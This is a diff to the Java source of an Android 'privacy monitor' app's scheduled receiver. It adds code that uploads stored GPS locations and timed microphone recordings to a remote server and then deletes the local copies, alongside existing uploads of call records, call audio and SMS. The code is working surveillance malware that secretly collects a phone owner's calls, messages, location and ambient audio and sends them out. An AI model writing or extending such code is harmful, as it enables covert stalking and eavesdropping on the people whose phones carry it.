@@ -2,12 +2,14 @@ package com.privacy.monitor.receiver;
 
 import java.io.File;
 import java.util.ArrayList;
+import java.util.Date;
 import org.json.JSONException;
 import org.json.JSONObject;
 import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
 import com.privacy.monitor.db.ContactsDB;
+import com.privacy.monitor.db.FileDB;
 import com.privacy.monitor.db.LocManDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.RegularDB;
@@ -15,12 +17,15 @@ import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.domain.CallRecord;
 import com.privacy.monitor.domain.Contacts;
 import com.privacy.monitor.domain.DeviceInfo;
+import com.privacy.monitor.domain.LocationMessage;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.Regular;
 import com.privacy.monitor.domain.SMSRecord;
+import com.privacy.monitor.domain.SoundFileInfo;
 import com.privacy.monitor.service.utilservice.ClientSocket;
 import com.privacy.monitor.service.utilservice.ExecuteImmLoc;
 import com.privacy.monitor.service.utilservice.ExecuteImmSoundRec;
+import com.privacy.monitor.util.AlarmManagerUtil;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
@@ -44,14 +49,16 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
 	private MonitorDB monitorDB;
 	private SMSRecordDB smsRecordDB;
+	private LocManDB locManDB;
+	private FileDB fileDB;
 	private CallRecordDB callRecordDB;
 	private ContactsDB contactsDB;
 	private RegularDB regularDB;
-	private LocManDB locManDB ;
 	private TelephonyManager tm;
 	private ClientSocket cSocket;
 	private String myPhone;
-	private boolean isCloseMobileNet ;
+	private String deviceId;
+	private boolean isCloseMobileNet,isSendLoc,isSendRec ;
 	private Context context;
 	private Thread executeLoc,executeSoundRec;
 	private  SharedPreferences sp ;
@@ -60,13 +67,16 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	public void onReceive(final Context context, Intent intent) {
 		this.context = context;
 		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		deviceId = sp.getString(C.DEVICE_ID,"");
 		if(TextUtils.isEmpty(myPhone)){
 			myPhone = sp.getString(C.PHONE_NUM,"");
 		}
+		
+		locManDB = LocManDB.getInstance(context);
+		fileDB = FileDB.getInstance(context);
 		smsRecordDB = SMSRecordDB.getInstance(context);
 		callRecordDB = CallRecordDB.getInstance(context);
 		monitorDB = MonitorDB.getInstance(context);
-		locManDB = LocManDB.getInstance(context);
 		regularDB = RegularDB.getInstance(context);
 		contactsDB = ContactsDB.getInstance(context);
 		
@@ -77,7 +87,6 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		}
 		
 		if(cSocket == null){
-		
 			String devBrand = sp.getString(C.DEVICE_BRAND,"");
 			String devPhone = sp.getString(C.PHONE_NUM,"");
 			String devID = sp.getString(C.DEVICE_ID,"");
@@ -124,17 +133,6 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 				}
-				Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE,new String []{myPhone});
-				String callStatus = monitor.getCallMonitorStatus();
-				String smsStatus = monitor.getSmsMonitorStatus();
-				if("1".equals(callStatus)){
-					uploadCallRecord(callRecordDB,context);
-				}
-				
-				if("1".equals(smsStatus)){
-					 uploadSMSData(smsRecordDB,context);
-				}
-				
 				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 				String simID = tm.getSimSerialNumber();
 				
@@ -144,6 +142,24 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					editor.putString(C.PHONE_NUM,simID);
 					editor.commit();
 				}
+				
+				Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ?",new String []{myPhone});
+				if(monitor !=null){
+					String callStatus = monitor.getCallMonitorStatus();
+					String smsStatus = monitor.getSmsMonitorStatus();
+					if("1".equals(callStatus)){
+						uploadCallRecord(callRecordDB,context);
+					}
+					
+					if("1".equals(smsStatus)){
+						 uploadSMSData(smsRecordDB,context);
+					}
+					uploadLocList();
+					uploadRecList();
+				}
+				
+				
+				
 			
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
@@ -194,11 +210,11 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				callRec.add(callRecord.getFileName());
 				lists.add(callRec);
 				String params = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&call_list=" + new Gson().toJson(lists);
-				String uploadResult = NetworkUtil.uploadCall(params,C.RequestMethod.uploadCallRecord);
+				String uploadResult = NetworkUtil.uploadCall(context,params,C.RequestMethod.uploadCallRecord);
 			    if(uploadResult !=null && !uploadResult.startsWith("FAIL")){
 			    	String filePath = callRecord.getSoundRecordPath();
 			    	if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
 			    		if(uploadFileResult.contains("FAULT")){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
@@ -217,7 +233,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			 }else{
 				 String filePath = callRecord.getSoundRecordPath();
 				 if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
 			    		if(uploadFileResult.contains("FAIL")){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
@@ -235,6 +251,57 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			 }
 		  }
 	   }
+	}
+	
+	//上传定时定位信息
+	private void uploadLocList(){
+		ArrayList<LocationMessage> arrayList = locManDB.queryAll();
+		if(arrayList !=null){
+			int size = arrayList.size();
+			for(int i = 0 ; i < size ; i++){
+				LocationMessage lm = arrayList.get(i);
+				String longitude = lm.getLongitude();
+				String latitude = lm.getLatitude();
+				long strTime = Long.valueOf(lm.getLocTime());
+				String result = NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", strTime + "",C.RequestMethod.uploadLocation);
+			    if(!TextUtils.isEmpty(result) && !result.startsWith("FAIL")){
+			    	locManDB.delete(LocationMessage.COL_ID +" =? ", new String []{lm.getId()} );
+			    }
+			}
+		}
+	}
+	
+	//上传定时录音信息
+	private void uploadRecList(){
+		
+		ArrayList<SoundFileInfo> sfi = fileDB.queryAll();
+		if(sfi !=null){
+			int size = sfi.size();
+			for(int i = 0 ; i < size ; i++){
+				SoundFileInfo fileInfo = sfi.get(i);
+				ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
+				ArrayList<String> one = new ArrayList<String>();
+				one.add(fileInfo.getStartTime());
+				one.add(fileInfo.getEndTime());
+				String id = fileInfo.getId();
+				String fileName = fileInfo.getFileName();
+				one.add(fileInfo.getFileName());
+				String filePath = fileInfo.getFilePath();
+				list.add(one);
+				String param = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + deviceId + "&rec_list=" + new Gson().toJson(list);
+				String uploadResult = NetworkUtil.uploadFileInfo(context, param, C.RequestMethod.uploadCallSoundIntrod);
+				if(!TextUtils.isEmpty(uploadResult)&& !uploadResult.startsWith("FAIL")){
+					Logger.d("Cron","上传定时录音文件信息成功");
+					String uploadFileResult = NetworkUtil.uploadFile(context, filePath, fileName, C.RequestMethod.uploadCallSoundFile);
+					if(!TextUtils.isEmpty(uploadResult) && !uploadFileResult.startsWith("FAIL")){
+						Logger.d("Cron","上传定时录音文件成功");
+						fileDB.delete(LocationMessage.COL_ID+" =? ",new String []{id});
+						File file =new File(filePath);
+						file.delete();
+					}
+				}
+			}
+		}
 	}
 	
 	private void uploadContact(Context context,SharedPreferences sp){
@@ -488,9 +555,9 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	
 	//定时录音
 	private void parseSoundRec(String reString){
+		boolean isExecuteTask = false;
 		if(!TextUtils.isEmpty(reString)){
 			if(reString.contains(",")){
-				
 				String [] regs = reString.split(",");
 				if(regs !=null && regs.length > 0){
 					int size = regs.length;
@@ -499,11 +566,20 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 						if(rege !=null && rege.length==2){
 							String strStart = rege[0];
 							String strLong = rege[1];
-							Regular regular = new Regular();
-							regular.setLocLong(strLong);
-							regular.setLocStartTime(strStart);
-							regular.setRegType(C.REG_TYPE_REC);
-							regularDB.insert(regular);
+							Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_REC});
+							if(regular2==null){
+								 Regular regular = new Regular();
+								 regular.setLocLong(strLong);
+								 regular.setLocStartTime(strStart);
+								 regular.setRegType(C.REG_TYPE_REC);
+								 regularDB.insert(regular);
+								 isExecuteTask = true;
+							}else {
+								if(!strLong.equals(regular2.getLocLong())){
+									regular2.setLocLong(strLong);
+									regularDB.update(regular2,C.REG_TYPE_LOC);
+								}
+							}
 						}
 					}
 				}
@@ -513,11 +589,39 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(regularMess !=null && regularMess.length==2){
 					String strStart = regularMess[0];
 					String strLong = regularMess[1];
-					Regular regular = new Regular();
-					regular.setLocLong(strLong);
-					regular.setLocStartTime(strStart);
-					regular.setRegType(C.REG_TYPE_REC);
-					regularDB.insert(regular);
+					Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_REC});
+					if(regular2==null){
+						Regular regular = new Regular();
+						regular.setLocLong(strLong);
+						regular.setLocStartTime(strStart);
+						regular.setRegType(C.REG_TYPE_REC);
+						regularDB.insert(regular);
+						isExecuteTask = true;
+					}else {
+						if(!strLong.equals(regular2.getLocLong())){
+							regular2.setLocLong(strLong);
+							regularDB.update(regular2,C.REG_TYPE_LOC);
+						}
+					}
+				}
+			}
+		}
+		if(isExecuteTask && !isSendRec){
+			Regular regular = regularDB.queryOnlyRow(Regular.COL_TYPE +" = ? ",new String []{C.REG_TYPE_REC});
+			if(regular !=null){
+				String startTime = regular.getLocStartTime();
+				if(!TextUtils.isEmpty(startTime)){
+					Date date = new Date();
+					long curTime = date.getTime();
+					long executeTime = Long.valueOf(startTime);
+					long recLong = Long.valueOf(regular.getLocLong());
+					if(executeTime > curTime){
+						isSendRec = true;
+						AlarmManagerUtil.sendSoundRecBroadcast(context, executeTime,C.SOUND_REC_ACTION,recLong);
+					}else {
+						regularDB.delete(Regular.COL_REG_START +" = ? ",new String []{executeTime+""});
+						Logger.d("Cron","删除定时录音信息成功");
+					}
 				}
 			}
 		}
@@ -526,6 +630,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	//解析定时定位
 	private void parseLoc(String reStr){
 		if(!TextUtils.isEmpty(reStr)){
+			boolean isExecuteLoc = false;
 			if(reStr.contains(",")){
 				
 				String [] loc = reStr.split(",");
@@ -536,11 +641,20 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 						if(locc !=null && locc.length==2){
 							String strStart = locc[0];
 							String strLong = locc[1];
-							Regular regular = new Regular();
-							regular.setLocLong(strLong);
-							regular.setLocStartTime(strStart);
-							regular.setRegType(C.REG_TYPE_LOC);
-							regularDB.insert(regular);
+						   Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_LOC});
+						   if(regular2==null){
+							   Regular regular = new Regular();
+								regular.setLocLong(strLong);
+								regular.setLocStartTime(strStart);
+								regular.setRegType(C.REG_TYPE_LOC);
+								regularDB.insert(regular);
+								isExecuteLoc = true;
+						   }else {
+								if(!strLong.equals(regular2.getLocLong())){
+									regular2.setLocLong(strLong);
+									regularDB.update(regular2,C.REG_TYPE_LOC);
+								}
+							}
 						}
 					}
 				}
@@ -550,11 +664,37 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(regularMess !=null && regularMess.length==2){
 					String strStart = regularMess[0];
 					String strLong = regularMess[1];
-					Regular regular = new Regular();
-					regular.setLocLong(strLong);
-					regular.setLocStartTime(strStart);
-					regular.setRegType(C.REG_TYPE_LOC);
-					regularDB.insert(regular);
+					 Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_LOC});
+					 if(regular2==null){
+						    Regular regular = new Regular();
+							regular.setLocLong(strLong);
+							regular.setLocStartTime(strStart);
+							regular.setRegType(C.REG_TYPE_LOC);	
+							regularDB.insert(regular);
+							isExecuteLoc = true;
+					 }else {
+						if(!strLong.equals(regular2.getLocLong())){
+							regular2.setLocLong(strLong);
+							regularDB.update(regular2,C.REG_TYPE_LOC);
+						}
+					}
+				}
+			}
+			
+			if(isExecuteLoc && !isSendLoc){
+				Regular regular = regularDB.queryOnlyRow(Regular.COL_TYPE +" = ? ",new String []{C.REG_TYPE_LOC});
+				if(regular !=null){
+					String strTime = regular.getLocStartTime();
+					long lonStartTime = Long.valueOf(strTime);
+					long curTime = new Date().getTime();
+					if(lonStartTime > curTime){
+						Logger.d("Cron","发送定时定位信息了");
+						AlarmManagerUtil.sendLocBroadcast(context, lonStartTime,C.LOC_ACTION);
+						isSendLoc = true;
+					}else {
+						regularDB.delete(Regular.COL_REG_START +" = ? ",new String []{lonStartTime+""});
+						Logger.d("Cron","删除定时定位信息成功");
+					}
 				}
 			}
 		}
